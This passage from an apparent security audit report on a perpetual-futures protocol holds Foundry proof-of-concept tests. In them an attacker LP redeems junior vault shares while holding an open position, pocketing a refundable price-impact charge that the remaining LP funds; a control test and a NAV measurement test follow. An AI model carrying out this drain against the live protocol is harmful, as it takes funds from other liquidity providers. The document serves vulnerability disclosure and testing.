        assertGt(claimable, 0, "the redemption must be funded");
        vm.prank(lp);
        assetsOut = juniorVault.claimRedeem(requestId, claimable, lp, lp);
    }

    function _attackerHeldValue() private view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER) + _shareValue(ATTACKER);
    }

    function _setUpBothLegs() private {
        _refreshMark();
        _fundJunior(VICTIM, LP_EACH);
        _fundJunior(ATTACKER, LP_EACH);
        attackerMinted += LP_EACH;
        _fundTrader(ATTACKER, TRADER_FUNDING);
        attackerMinted += TRADER_FUNDING;
        _refreshMark();
    }

    function _openAtMark() private {
        _open(ATTACKER, CfdTypes.Side.LONG, SIZE, MARGIN, MARK, pool.totalAssets());
    }

    function _closeAtMark() private {
        _refreshMark();
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(ATTACKER);
        if (size != 0) {
            _close(ATTACKER, side, size, MARK, pool.totalAssets());
        }
    }

    function _report(
        string memory label
    ) private {
        emit log_string(label);
        emit log_named_uint("   pool depth            ", pool.totalAssets());
        emit log_named_uint("   junior NAV            ", juniorVault.totalAssets());
        emit log_named_uint("   victim share value    ", _shareValue(VICTIM));
        emit log_named_uint("   attacker share value  ", _shareValue(ATTACKER));
        emit log_named_uint("   attacker wallet       ", settlementToken.balanceOf(ATTACKER));
        emit log_named_uint("   attacker clearinghouse", clearinghouse.balanceAssets(ATTACKER));
    }

    /// @dev The attack. The attacker redeems their Junior shares while their own position is still open,
    ///      so the redemption is priced against a NAV that contains the refundable VPI charge.
    function test_AttackerRedeemsAgainstRefundableVpiAndRemainingLpFundsIt() public {
        _setUpBothLegs();

        uint256 victimStart = _shareValue(VICTIM);
        _report("1. both LPs in, no position");

        _openAtMark();
        _report("2. position open, VPI charge now inside junior NAV");

        uint256 redeemed = _exitJuniorFully(ATTACKER);
        emit log_named_uint(">> attacker redeemed    ", redeemed);
        _report("3. attacker fully exited the junior tranche");

        _closeAtMark();
        _report("4. position closed at the opening mark, zero price PnL");

        uint256 victimEnd = _shareValue(VICTIM);
        uint256 attackerEnd = _attackerHeldValue();

        emit log_string("--- outcome ---");
        emit log_named_uint("   attacker contributed  ", attackerMinted);
        emit log_named_uint("   attacker holds        ", attackerEnd);
        emit log_named_int("   attacker net          ", int256(attackerEnd) - int256(attackerMinted));
        emit log_named_uint("   victim deposited      ", LP_EACH);
        emit log_named_uint("   victim share value    ", victimEnd);
        emit log_named_int("   victim net            ", int256(victimEnd) - int256(LP_EACH));
        emit log_named_int("   victim vs start       ", int256(victimEnd) - int256(victimStart));

        assertEq(engine.lastMarkPrice(), MARK, "the mark must be unchanged end to end");
        (uint256 remaining,,,,,,) = engine.positions(ATTACKER);
        assertEq(remaining, 0, "the position must be fully closed");
    }

    /// @dev The control. Identical except that the attacker keeps their Junior shares through the close, so
    ///      they are still an LP when the pool refunds the VPI charge.
    function test_ControlAttackerHoldsJuniorSharesThroughTheClose() public {
        _setUpBothLegs();

        uint256 victimStart = _shareValue(VICTIM);
        _report("1. both LPs in, no position");

        _openAtMark();
        _report("2. position open, VPI charge now inside junior NAV");

        _closeAtMark();
        _report("3. position closed, attacker still an LP");

        uint256 redeemed = _exitJuniorFully(ATTACKER);
        emit log_named_uint(">> attacker redeemed    ", redeemed);

        uint256 victimEnd = _shareValue(VICTIM);
        uint256 attackerEnd = _attackerHeldValue();

        emit log_string("--- outcome ---");
        emit log_named_uint("   attacker contributed  ", attackerMinted);
        emit log_named_uint("   attacker holds        ", attackerEnd);
        emit log_named_int("   attacker net          ", int256(attackerEnd) - int256(attackerMinted));
        emit log_named_uint("   victim deposited      ", LP_EACH);
        emit log_named_uint("   victim share value    ", victimEnd);
        emit log_named_int("   victim net            ", int256(victimEnd) - int256(LP_EACH));
        emit log_named_int("   victim vs start       ", int256(victimEnd) - int256(victimStart));
    }

}

```

### 4.6 Supporting measurement

A second test isolates the mechanism with a single account and no LP exit, showing the charge enter
share NAV on the open and leave it on the close.

`packages/perps/test/perps/accounting/close/ZzVpiRevenueRecognition.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// MEASUREMENT, not an assertion of a bug. Reports the junior share NAV across one VPI round trip.
//
// The question. A VPI charge paid at open is, by the curve's own symmetry, refunded in full when the position
// unwinds the same skew at the same depth: cost(S,D) - cost(0,D) at open and cost(0,D) - cost(S,D) at close are
// exact negatives, so the lifetime clamp in CloseAccountingLib:115-117 does not even need to bind. The charge is
// therefore a refundable deposit for the life of the position.
//
// What this measures is whether that refundable amount is nevertheless counted into junior share NAV while the
// position is open. `TrancheVault.totalAssets()` reads `HousePool.getPendingTrancheState()`, which is the same
// number that prices every deposit and redemption, so a transient bump there is a transient mispricing of shares.
//
// Why no aggregate reserve could absorb it: `grep -rn 'totalVpi\|aggregateVpi\|vpiLiabilit' src/` returns nothing,
// and the pool's withdrawal reserve is `maxLiability + traderClaims + supplemental` (HousePoolAccountingLib:45-54),
// where maxLiability is the price-PnL envelope only. SECURITY.md states the same: "carry, VPI, fees, frozen spread,
// and liquidation charges stay outside the pre-close price book".
//
// Prediction at the deployed vpiFactor of 0.01e18, with depth D and skew S:
//   VPI charge X = 0.005 * S^2 / D. For S = 300,000 and D = 1,000,000 that is 450 USDG.
//   Execution fee = 4 bps of notional = 120 USDG per leg.
// So the open should raise junior NAV by about 570, and the close should take the 450 back and leave the fees.
//
// Run: forge test --root packages/perps --match-path 'test/perps/accounting/close/ZzVpiRevenueRecognition.t.sol' -vv

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

contract ZzVpiRevenueRecognitionTest is BasePerpTest {

    address private constant VICTIM_LP = address(0xBEEF);
    address private constant TRADER = address(0xA11CE);

    uint256 private constant MARK = 1e8;
    uint256 private constant NOTIONAL = 300_000e6;
    uint256 private constant SIZE = 300_000e18;

    /// @dev Release parameters from DEPLOYMENT.md, not the harness defaults. vpiFactor is the field that matters
    ///      here: BasePerpTest pins it to 0, which switches the entire mechanism under test off.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.baseCarryBps = 500;
        params.minBountyAssets = 1e6;
        params.bountyBps = 10;
    }

    function _refreshMark() private {
        vm.warp(block.timestamp + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(MARK, SafeCast.toUint64(block.timestamp));
    }

    function _report(
        string memory label
    ) private returns (uint256 juniorNav) {
        juniorNav = juniorVault.totalAssets();
        emit log_string(label);
        emit log_named_uint("   junior share NAV      ", juniorNav);
        emit log_named_uint("   junior supply         ", juniorVault.totalSupply());
        emit log_named_uint("   pool totalAssets       ", pool.totalAssets());
        emit log_named_uint("   trader clearinghouse   ", clearinghouse.balanceAssets(TRADER));
    }

    function test_VpiChargeEntersJuniorNavWhileRefundable() public {
        _refreshMark();
        _fundJunior(VICTIM_LP, 1_000_000e6);
        _fundTrader(TRADER, 200_000e6);
        _refreshMark();

        uint256 navBefore = _report("1. before the open");
        uint256 traderBefore = clearinghouse.balanceAssets(TRADER);

        uint256 depth = pool.totalAssets();
        emit log_named_uint(">> depth used for VPI    ", depth);
        _open(TRADER, CfdTypes.Side.LONG, SIZE, 50_000e6, MARK, depth);

        uint256 navAfterOpen = _report("2. after the open, position still live");

        // Close at the same mark and the same depth, so realised price PnL is exactly zero and the only
        // economics are the VPI round trip plus the two execution fees.
        _refreshMark();
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(TRADER);
        _close(TRADER, side, size, MARK, pool.totalAssets());

        uint256 navAfterClose = _report("3. after the close");
        uint256 traderAfter = clearinghouse.balanceAssets(TRADER);

        emit log_string("--- deltas ---");
        emit log_named_int("   NAV open minus before  ", int256(navAfterOpen) - int256(navBefore));
        emit log_named_int("   NAV close minus open   ", int256(navAfterClose) - int256(navAfterOpen));
        emit log_named_int("   NAV net over round trip", int256(navAfterClose) - int256(navBefore));
        emit log_named_int("   trader net             ", int256(traderAfter) - int256(traderBefore));

        // The transient component is what an exiting LP would capture and a remaining LP would fund.
        if (navAfterOpen > navBefore && navAfterClose < navAfterOpen) {
            emit log_named_uint(">>> TRANSIENT NAV BUMP   ", navAfterOpen - navAfterClose);
        }
    }

}

```
